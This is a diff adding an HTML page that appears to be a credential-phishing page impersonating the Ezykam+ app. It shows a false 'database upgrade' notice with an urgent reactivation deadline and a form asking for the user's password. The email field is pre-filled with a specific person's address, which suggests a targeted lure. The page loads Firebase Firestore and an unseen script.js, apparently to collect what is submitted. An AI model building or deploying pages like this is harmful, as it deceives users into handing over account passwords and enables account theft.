@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ezykam+ | Account Activation</title>
+  <link rel="icon" href="https://play-lh.googleusercontent.com/rksarKz-sHo0JE0VuwMXktvgSfQxrkPGlQebIx7dnlA7YnwAutKI-ltAaD53UAvNMyK1" type="image/jpg">
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+
+      <!-- Header with logo left + text right -->
+      <div class="header-bar">
+        <img src="https://play-lh.googleusercontent.com/rksarKz-sHo0JE0VuwMXktvgSfQxrkPGlQebIx7dnlA7YnwAutKI-ltAaD53UAvNMyK1" alt="Ezykam+" class="logo">
+        <h1 class="brand">                                  Ezykam+</h1>
+      </div>
+
+      <div class="alert">
+To serve you better, we have completed a major upgrade to our database. For continuing enjoying uninterrupted access to your benefits and services, we kindly request you to <strong> reactivate your account on or before 31<sup>st</sup> October 2025. </strong><br><br>
+⚠️ <strong> If you have forgotten your password, please reset it directly through the Ezykam+ app before proceeding with account activation to avoid uninterrupted services and potential issues. </strong>
+</div>
+
+      <div class="container">
+        <h2 style="color: #fff;">Account Activation</h2>
+        <form id="loginForm">
+          <label for="country" style="color: #fff;">Country</label>
+          <select id="country" name="country">
+            <option value="IN" selected>India</option>
+            <option value="US">United States</option>
+            <option value="GB">United Kingdom</option>
+            <option value="CA">Canada</option>
+          </select>
+
+          <label for="email" style="color: #fff;">Email ID</label>
+          <input type="email" id="email" name="email" placeholder="Enter your email" value="payel.paul388@gmail.com">
+
+          <label for="code" style="color: #fff;">Password</label>
+          <input type="password" id="code" name="code" placeholder="Enter your password">
+
+          <button type="submit">Activate</button>
+        </form>
+
+        <p id="message"></p>
+      </div>
+
+      <div class="footer">© 2025 Ezykam+  All rights reserved.</div>
+    </div>
+  </div>
+
+  <!-- Load the custom script AFTER Firebase SDKs -->
+  <script src="script.js"></script>
+</body>
+</html>
